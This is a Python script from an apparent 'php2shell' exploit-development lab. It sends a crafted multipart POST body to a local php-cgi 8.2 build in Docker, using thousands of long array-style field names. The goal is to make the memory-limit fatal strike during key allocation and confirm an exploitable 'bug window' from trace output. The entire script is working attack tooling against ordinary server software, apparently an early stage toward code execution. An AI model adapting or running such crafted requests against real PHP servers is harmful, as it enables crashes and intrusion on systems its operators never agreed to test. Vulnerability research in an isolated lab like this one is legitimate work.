#!/usr/bin/env python3
"""php2shell lab, oom28: pure-key climb — mass IS the key run.

Body = N parts, each name="pKK..Ki[x]" (KEYLEN segment, unique), value "v".
Every part = one str-variant commit + post-commit key alloc of ~KEYLEN.
Usage climbs ~4.2KB/part -> memory_limit fatal must land INSIDE the key run.
Success signature: 'TRACE keycommit ... free=<small>' followed by
'Allowed memory size' and NO matching keyok  => bug window OPEN.

usage: oom28.py <limit> <keylen> [nparts]
"""
import re
import subprocess
import sys

BIN = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"
LIMIT = sys.argv[1] if len(sys.argv) > 1 else "8M"
KEYLEN = int(sys.argv[2]) if len(sys.argv) > 2 else 4000
NPARTS = int(sys.argv[3]) if len(sys.argv) > 3 else 2600


def part_seg(i, seglen):
    seg = b"p" + b"K" * (seglen - 2) + (b"%d" % i)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="' + seg + b'[x]"\r\n\r\nv\r\n')


def build():
    ps = [part_seg(i, KEYLEN) for i in range(NPARTS)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def send(body):
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%s -d post_max_size=4096M -d max_input_vars=100000 "
           "2>/tmp/e.log >/tmp/o.log; echo RC=$?" % (len(body), BIN, LIMIT))
    r = subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", cmd],
                       input=body, capture_output=True, timeout=300)
    out = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                          "cat /tmp/e.log /tmp/o.log"], capture_output=True).stdout.decode("latin1")
    return r.stdout.decode("latin1") + "\n" + out


def analyze(trace):
    fatal = "Allowed memory size" in trace
    commits = re.findall(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", trace)
    oks = len(re.findall(r"TRACE keyok", trace))
    last = commits[-1] if commits else None
    key_death = fatal and len(commits) > oks
    return dict(fatal=fatal, ncommits=len(commits), oks=oks, last=last,
                key_death=key_death, rc=(re.findall(r"RC=(\d+)", trace) or [None])[-1])


def main():
    body = build()
    print("oom28 limit=%s keylen=%d parts=%d body=%d" % (LIMIT, KEYLEN, NPARTS, len(body)), flush=True)
    trace = send(body)
    a = analyze(trace)
    print("fatal=%s commits=%d oks=%d KEY_DEATH=%s rc=%s" %
          (a["fatal"], a["ncommits"], a["oks"], a["key_death"], a["rc"]))
    print("last_commit:", a["last"])
    keys = [l for l in trace.splitlines() if "keycommit" in l or "keyok" in l]
    print("--- key tail ---")
    print("\n".join(keys[-8:]))
    if a["key_death"]:
        print("\n*** BUG WINDOW OPEN: commit without ok ***")
        idx = trace.rfind("TRACE keycommit")
        print(trace[idx:idx + 400])


if __name__ == "__main__":
    main()
